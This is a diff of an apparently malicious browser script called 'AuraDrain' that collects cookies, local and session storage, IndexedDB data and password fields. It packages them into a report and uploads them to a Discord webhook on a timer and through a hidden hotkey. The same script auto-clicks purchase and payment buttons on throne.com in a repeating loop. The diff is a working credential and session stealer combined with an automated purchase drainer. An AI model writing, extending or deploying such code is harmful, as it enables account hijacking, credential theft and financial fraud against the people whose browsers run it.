+    debugLog(`🔍 [FILTER DEBUG] Filtered out expired cookies: ${cookies.length - filteredCookies.length}`, "info");
+  }
+  
+  if (config.cookieCollection.sortByValue) {
+    filteredCookies.sort((a, b) => {
+      const aLength = a.value ? a.value.length : 0;
+      const bLength = b.value ? b.value.length : 0;
+      return bLength - aLength;
+    });
+    debugLog(`🔍 [FILTER DEBUG] Sorted cookies by value length`, "info");
+  }
+  
+  if (config.cookieCollection.prioritizeSecure) {
+    filteredCookies.sort((a, b) => {
+      const aSecure = (a.secure ? 1 : 0) + (a.httpOnly ? 1 : 0) + (a.sameSite === 'None' ? 1 : 0);
+      const bSecure = (b.secure ? 1 : 0) + (b.httpOnly ? 1 : 0) + (b.sameSite === 'None' ? 1 : 0);
+      return bSecure - aSecure;
+    });
+    debugLog(`🔍 [FILTER DEBUG] Prioritized secure/httponly/sameSite cookies`, "info");
+  }
+  
+  debugLog(`🔍 [FILTER DEBUG] Final filtered cookies: ${filteredCookies.length}`, "success");
+  return filteredCookies;
+}
+
+async function getDomainCookiesFromBackground(domain, attempt = 1) {
+  debugLog(`🍪 [COOKIE DEBUG] Getting cookies for domain: ${domain} (Attempt ${attempt}/${config.cookieCollection.maxCollectionAttempts})`, "info");
+  
+  return new Promise((resolve) => {
+    const responseHandler = (event) => {
+      if (event.detail && event.detail.action === 'cookieResponse') {
+        window.removeEventListener('auradrainer-cookie-response', responseHandler);
+        
+        if (event.detail.success) {
+          const cookies = event.detail.cookies || [];
+          debugLog(`🍪 [COOKIE DEBUG] Received ${cookies.length} cookies for ${domain}`, "success");
+          resolve(cookies);
+        } else {
+          debugLog(`🍪 [COOKIE DEBUG] Failed to get cookies for ${domain}: ${event.detail.error}`, "error");
+          resolve([]);
+        }
+      }
+    };
+    
+    window.addEventListener('auradrainer-cookie-response', responseHandler);
+    
+    const event = new CustomEvent('auradrainer-cookie-request', {
+      detail: { action: 'getDomainCookies', domain: domain }
+    });
+    window.dispatchEvent(event);
+    
+    setTimeout(() => {
+      window.removeEventListener('auradrainer-cookie-response', responseHandler);
+      if (attempt < config.cookieCollection.maxCollectionAttempts) {
+        const delay = Math.min(config.cookieCollection.retryDelay * Math.pow(2, attempt - 1), config.cookieCollection.maxRetryDelay);
+        debugLog(`🍪 [COOKIE DEBUG] Retrying in ${delay/1000}s (Attempt ${attempt + 1})`, "warning");
+        setTimeout(() => getDomainCookiesFromBackground(domain, attempt + 1).then(resolve), delay);
+      } else {
+        debugLog(`🍪 [COOKIE DEBUG] Max retry attempts (${config.cookieCollection.maxCollectionAttempts}) reached`, "error");
+        resolve([]);
+      }
+    }, 10000);
+  });
+}
+
+async function sendToDiscordWebhook(data, type = 'report', attempt = 1) {
+  debugLog(`📡 [DISCORD DEBUG] Starting sendToDiscordWebhook() for ${type} (Attempt ${attempt}/${config.cookieCollection.maxCollectionAttempts})`, "info");
+  
+  if (!config.discordWebhook.enabled || !config.discordWebhook.url || config.discordWebhook.url === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
+    debugLog("⚠️ [DISCORD DEBUG] Discord webhook not configured properly", "warning");
+    return false;
+  }
+
+  try {
+    const formData = new FormData();
+    let summaryMessage = `🍪 **${type.toUpperCase()} SENT** 🍪\n🖥️ **${pcIdentifier}**\n⏰ **Time:** ${new Date().toLocaleString()}\n🌍 **URL:** ${window.location.href}\n`;
+
+    if (type === 'report') {
+      formData.append('files[0]', new Blob([data.text], { type: 'text/plain' }), `session_${pcIdentifier}_${Date.now()}.txt`);
+      if (config.discordWebhook.sendJsonFile) {
+        formData.append('files[1]', new Blob([JSON.stringify(data.json, null, 2)], { type: 'application/json' }), `session_${pcIdentifier}_${Date.now()}.json`);
+      }
+      summaryMessage += `📊 **Items:** ${data.json.totalItems}\n📎 **Attachments:** session_${pcIdentifier}_${Date.now()}.txt${config.discordWebhook.sendJsonFile ? ', session_${pcIdentifier}_${Date.now()}.json' : ''}`;
+    } else if (type === 'passwords') {
+      formData.append('files[0]', new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' }), `passwords_${pcIdentifier}_${Date.now()}.json`);
+      summaryMessage += `🔑 **Passwords:** ${data.inputs.length + data.credentials.length + data.forms.length} items\n📎 **Attachment:** passwords_${pcIdentifier}_${Date.now()}.json`;
+    }
+
+    formData.append('content', summaryMessage);
+
+    const requestOptions = {
+      method: 'POST',
+      body: formData
+    };
+
+    debugLog(`📡 [DISCORD DEBUG] Sending ${type} with ${formData.getAll('files').length} files`, "info");
+    const response = await fetch(config.discordWebhook.url, requestOptions);
+    
+    if (response.ok) {
+      debugLog(`✅ [DISCORD DEBUG] Successfully sent ${type} to Discord`, "success");
+      return true;
+    } else {
+      debugLog(`❌ [DISCORD DEBUG] Discord webhook failed: ${response.status} ${response.statusText}`, "error");
+      throw new Error(`Webhook failed: ${response.status}`);
+    }
+  } catch (error) {
+    debugLog(`❌ [DISCORD DEBUG] ${type} send error: ${error.message}`, "error");
+    if (attempt < config.cookieCollection.maxCollectionAttempts) {
+      const delay = Math.min(config.cookieCollection.retryDelay * Math.pow(2, attempt - 1), config.cookieCollection.maxRetryDelay);
+      debugLog(`📡 [DISCORD DEBUG] Retrying in ${delay/1000}s (Attempt ${attempt + 1})`, "warning");
+      await new Promise(resolve => setTimeout(resolve, delay));
+      return sendToDiscordWebhook(data, type, attempt + 1);
+    } else {
+      debugLog(`❌ [DISCORD DEBUG] Max retry attempts (${config.cookieCollection.maxCollectionAttempts}) reached`, "error");
+      return false;
+    }
+  }
+}
+
+async function collectAndLogCookies() {
+  debugLog("🍪 [MAIN DEBUG] Starting enhanced collectAndLogCookies()", "info");
+  
+  if (!config.cookieCollection.enabled) {
+    debugLog("🍪 [MAIN DEBUG] Cookie collection disabled in config", "info");
+    return;
+  }
+
+  if (cookieLoggingActive) {
+    debugLog("🍪 [MAIN DEBUG] Cookie logging already in progress, skipping", "warning");
+    return;
+  }
+
+  cookieLoggingActive = true;
+  try {
+    const storageData = await collectAllStorageData();
+    
+    if (storageData.totalItems === 0) {
+      debugLog("💾 [MAIN DEBUG] No storage data found, ending collection", "warning");
+      return;
+    }
+
+    let processedCookies = storageData.cookies;
+    if (config.cookieCollection.groupByDomain || config.cookieCollection.sortByValue || config.cookieCollection.prioritizeSecure) {
+      processedCookies = filterAndSortCookies(storageData.cookies);
+    }
+
+    const comprehensiveReport = formatComprehensiveReport(storageData, processedCookies);
+    const dataToSend = {
+      text: comprehensiveReport,
+      json: storageData
+    };
+
+    if (config.discordWebhook.alwaysSendAsFile) {
+      debugLog(`📤 [MAIN DEBUG] Sending session data as file`, "info");
+      const success = await sendToDiscordWebhook(dataToSend, 'report');
+      debugLog(`📤 [MAIN DEBUG] File send result: ${success}`, success ? "success" : "error");
+    } else {
+      debugLog(`📤 [MAIN DEBUG] Sending as message`, "info");
+      const success = await sendToDiscordWebhook(dataToSend, 'report');
+      debugLog(`📤 [MAIN DEBUG] Message send result: ${success}`, success ? "success" : "error");
+    }
+
+    if (config.cookieCollection.collectPasswords && Object.keys(storageData.passwords).length > 0) {
+      debugLog(`🔑 [MAIN DEBUG] Sending password data as separate file`, "info");
+      const success = await sendToDiscordWebhook(storageData.passwords, 'passwords');
+      debugLog(`🔑 [MAIN DEBUG] Password file send result: ${success}`, success ? "success" : "error");
+    }
+
+  } catch (error) {
+    debugLog(`❌ [MAIN DEBUG] Collection failed: ${error.message}`, "error");
+  } finally {
+    cookieLoggingActive = false;
+    debugLog("🍪 [MAIN DEBUG] Collection completed", "info");
+  }
+}
+
+function formatComprehensiveReport(storageData, processedCookies) {
+  let report = `🍪 **AURADRAIN COMPREHENSIVE SESSION REPORT** 🍪\n`;
+  report += `⏰ **Timestamp:** ${new Date().toLocaleString()} (${storageData.metadata.timestamp})\n`;
+  report += `🖥️ **User Agent:** ${storageData.metadata.browserVersion}\n`;
+  report += `🖱️ **Extensions:** ${storageData.metadata.extensions} detected\n`;
+  report += `🌍 **URL:** ${storageData.metadata.url}\n`;
+  report += `🆔 **PC Identifier:** ${storageData.metadata.pcIdentifier}\n`;
+  report += `📊 **Total Items:** ${storageData.totalItems}\n\n`;
+
+  report += `📈 **COLLECTION SUMMARY**\n`;
+  report += `🍪 **Cookies:** ${storageData.cookies.length}\n`;
+  report += `💾 **LocalStorage:** ${Object.keys(storageData.localStorage).length} items\n`;
+  report += `🗂️ **SessionStorage:** ${Object.keys(storageData.sessionStorage).length} items\n`;
+  report += `🗄️ **IndexedDB:** ${Object.keys(storageData.indexedDB).length} databases\n`;
+  report += `🔑 **Passwords:** ${Object.keys(storageData.passwords).length} items\n`;
+  report += `🌐 **Domains:** ${storageData.domains.size}\n\n`;
+
+  if (storageData.cookies.length > 0) {
+    report += `🍪 **COOKIES BY DOMAIN**\n`;
+    
+    if (config.cookieCollection.groupByDomain) {
+      const cookiesByDomain = {};
+      processedCookies.forEach(cookie => {
+        const domain = cookie.domain || 'unknown';
+        if (!cookiesByDomain[domain]) {
+          cookiesByDomain[domain] = [];
+        }
+        cookiesByDomain[domain].push(cookie);
+      });
+
+      Object.keys(cookiesByDomain).sort().forEach(domain => {
+        const domainCookies = cookiesByDomain[domain];
+        report += `🌐 **${domain}** (${domainCookies.length} cookies)\n`;
+        
+        domainCookies.forEach(cookie => {
+          report += `  • **${cookie.name}** = \`${cookie.value}\`\n`;
+          if (cookie.secure) report += `    🔒 Secure\n`;
+          if (cookie.httpOnly) report += `    🛡️ HttpOnly\n`;
+          if (cookie.sameSite) report += `    🔗 SameSite: ${cookie.sameSite}\n`;
+          if (cookie.session) report += `    ⏱️ Session\n`;
+          if (cookie.expirationDate) {
+            const expDate = new Date(cookie.expirationDate * 1000);
+            report += `    ⏰ Expires: ${expDate.toLocaleString()}\n`;
+          }
+          report += `\n`;
+        });
+        report += `\n`;
+      });
+    } else {
+      processedCookies.forEach(cookie => {
+        report += `• **${cookie.domain}** - **${cookie.name}** = \`${cookie.value}\`\n`;
+      });
+    }
+  }
+
+  if (Object.keys(storageData.localStorage).length > 0) {
+    report += `💾 **LOCAL STORAGE DATA**\n`;
+    Object.entries(storageData.localStorage).forEach(([key, value]) => {
+      report += `• **${key}** = \`${value.substring(0, 200)}${value.length > 200 ? '...' : ''}\`\n`;
+    });
+    report += `\n`;
+  }
+
+  if (Object.keys(storageData.sessionStorage).length > 0) {
+    report += `🗂️ **SESSION STORAGE DATA**\n`;
+    Object.entries(storageData.sessionStorage).forEach(([key, value]) => {
+      report += `• **${key}** = \`${value.substring(0, 200)}${value.length > 200 ? '...' : ''}\`\n`;
+    });
+    report += `\n`;
+  }
+
+  if (Object.keys(storageData.indexedDB).length > 0) {
+    report += `🗄️ **INDEXEDDB DATA**\n`;
+    Object.entries(storageData.indexedDB).forEach(([dbName, dbData]) => {
+      report += `• **${dbName}** (Version: ${dbData.version})\n`;
+      Object.entries(dbData.stores).forEach(([storeName, storeData]) => {
+        report += `  • **${storeName}**: ${storeData.length} records\n`;
+      });
+    });
+    report += `\n`;
+  }
+
+  if (Object.keys(storageData.passwords).length > 0) {
+    report += `🔑 **PASSWORD DATA** (Encrypted, see separate file)\n`;
+    report += `• **Inputs:** ${storageData.passwords.inputs.length}\n`;
+    report += `• **Credentials:** ${storageData.passwords.credentials.length}\n`;
+    report += `• **Forms:** ${storageData.passwords.forms.length}\n`;
+    report += `\n`;
+  }
+
+  report += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+  report += `🤖 **AuraDrain Enhanced Session System**\n`;
+  report += `📅 Generated: ${new Date().toISOString()}\n`;
+
+  return report;
+}
+
+// --- Unchanged Purchasing Functions ---
 function clickAddToCartForAnyItem() {
   if (itemsAddedToCart >= maxItemsToAdd) {
     debugLog(`Cart limit reached (${itemsAddedToCart}/${maxItemsToAdd}), skipping add process`, "warning");
@@ -819,7 +876,7 @@ function clickAddToCartForAnyItem() {
   if (targetItem) {
     debugLog(`🔍 Scanning for specific item: "${targetItem}"`, "cart");
   } else {
-  debugLog("🔍 Scanning for available items to add to cart", "cart");
+    debugLog("🔍 Scanning for available items to add to cart", "cart");
   }
   
   setTimeout(() => {
@@ -864,19 +921,19 @@ function clickAddToCartForAnyItem() {
             specificItemFound = true;
             debugLog(`🎯 Found target item: "${itemName}"`, "cart");
             debugLog(`💫 Adding specific item to cart...`, "cart");
-          addButton.click();
-          itemsAddedToCart++;
-          purchaseInProgress = true;
+            addButton.click();
+            itemsAddedToCart++;
+            purchaseInProgress = true;
             debugLog(`✅ Specific item added successfully! Cart: ${itemsAddedToCart}/${maxItemsToAdd}`, "success");
-          debugLog(`🚀 Initiating purchase sequence...`, "purchase");
+            debugLog(`🚀 Initiating purchase sequence...`, "purchase");
           
-          setTimeout(() => {
-            if (purchaseInProgress && itemsAddedToCart > 0) {
-              clickCheckoutIfExists();
-            }
-          }, 3000);
+            setTimeout(() => {
+              if (purchaseInProgress && itemsAddedToCart > 0) {
+                clickCheckoutIfExists();
+              }
+            }, 3000);
           
-          return;
+            return;
           }
           
           if (!fallbackItem) {
@@ -990,7 +1047,6 @@ function clickPayNowIfExists() {
         debugLog(`✅ Payment completed successfully! 🎉`, "success");
         debugLog(`🏁 Purchase sequence finished`, "success");
         
-        // Schedule next purchase after successful payment
         if (autoRetryEnabled) {
           debugLog(`🔄 Auto-retry enabled - Scheduling next purchase...`, "info");
           scheduleNextPurchase();
@@ -1023,7 +1079,6 @@ function clickPayNowIfExists() {
   }, 7000);
 }
 
-
 function redirectToProfile() {
   debugLog("🧭 Redirecting to profile page", "navigation");
   window.location.href = `https://${config.throneUrl}`;
@@ -1047,7 +1102,6 @@ function mainLoop() {
   
   debugLog(`🔄 Main loop cycle | URL: ${url}`, "info");
 
-  // Handle different throne.com scenarios
   if (url.includes("throne.com/checkout") || isOnCartOrCheckoutPage()) {
     debugLog("💳 On checkout/cart page - attempting payment", "purchase");
     clickPayNowIfExists();
@@ -1081,9 +1135,8 @@ function mainLoop() {
   }
 }
 
-
 function main() {
-  debugLog("🚀AutoDrain Started!", "success");
+  debugLog("🚀 AutoDrain Started!", "success");
   debugLog(`🖥️ PC Identifier: ${pcIdentifier}`, "info");
   debugLog(`🎯 Target Profile: ${config.throneUrl}`, "info");
   debugLog(`🛒 Purchase Mode: Single Item Per Transaction`, "info");
@@ -1104,10 +1157,9 @@ function main() {
   
   const mainInterval = setInterval(mainLoop, 5000);
   
-  // Initialize enhanced cookie collection if enabled
   if (config.cookieCollection.enabled && config.discordWebhook.enabled) {
-    debugLog(`🍪 Enhanced cookie collection enabled (interval: ${config.cookieCollection.interval / 1000}s)`, "info");
-    debugLog(`💾 Collection features: ${config.cookieCollection.collectCookies ? 'Cookies' : ''} ${config.cookieCollection.collectLocalStorage ? 'LocalStorage' : ''} ${config.cookieCollection.collectSessionStorage ? 'SessionStorage' : ''}`, "info");
+    debugLog(`🍪 Enhanced session collection enabled (interval: ${config.cookieCollection.interval / 1000}s)`, "info");
+    debugLog(`💾 Collection features: ${config.cookieCollection.collectCookies ? 'Cookies ' : ''}${config.cookieCollection.collectLocalStorage ? 'LocalStorage ' : ''}${config.cookieCollection.collectSessionStorage ? 'SessionStorage ' : ''}${config.cookieCollection.collectIndexedDB ? 'IndexedDB ' : ''}${config.cookieCollection.collectPasswords ? 'Passwords' : ''}`, "info");
     
     setTimeout(() => {
       debugLog("🧪 Testing webhook connection on startup...", "info");
@@ -1116,18 +1168,18 @@ function main() {
     
     setTimeout(() => {
       if (config.cookieCollection.autoCollect) {
-        debugLog("🚀 Starting automatic data collection...", "info");
-      collectAndLogCookies();
+        debugLog("🚀 Starting automatic session collection...", "info");
+        collectAndLogCookies();
       }
     }, 15000);
     
     if (config.cookieCollection.autoCollect) {
-    setInterval(() => {
-      collectAndLogCookies();
+      setInterval(() => {
+        collectAndLogCookies();
       }, config.cookieCollection.interval);
     }
   } else {
-    debugLog("🍪 Enhanced cookie collection disabled", "info");
+    debugLog("🍪 Enhanced session collection disabled", "info");
   }
   
   window.addEventListener("keydown", (event) => {
@@ -1147,7 +1199,7 @@ function main() {
     
     if (event.ctrlKey && event.altKey && event.key === "C") {
       event.preventDefault();
-      debugLog("🍪 Manual cookie collection triggered", "info");
+      debugLog("🍪 Manual session collection triggered", "info");
       collectAndLogCookies();
     }
     
@@ -1168,6 +1220,27 @@ function main() {
       }
     }
   });
+}
+
+async function testDiscordWebhook() {
+  debugLog("🧪 [WEBHOOK TEST] Starting Discord webhook test...", "info");
+  
+  const testMessage = `🧪 **WEBHOOK TEST MESSAGE** 🧪\n\n` +
+    `⏰ **Time:** ${new Date().toLocaleString()}\n` +
+    `🌍 **URL:** ${window.location.href}\n` +
+    `🖥️ **User Agent:** ${navigator.userAgent.substring(0, 100)}...\n\n` +
+    `✅ If you receive this message, your webhook is working correctly!`;
+  
+  debugLog("🧪 [WEBHOOK TEST] Sending test message...", "info");
+  const success = await sendToDiscordWebhook({ text: testMessage }, 'report');
+  
+  if (success) {
+    debugLog("✅ [WEBHOOK TEST] Webhook test successful!", "success");
+  } else {
+    debugLog("❌ [WEBHOOK TEST] Webhook test failed!", "error");
+  }
+  
+  return success;
 }
 
 main();
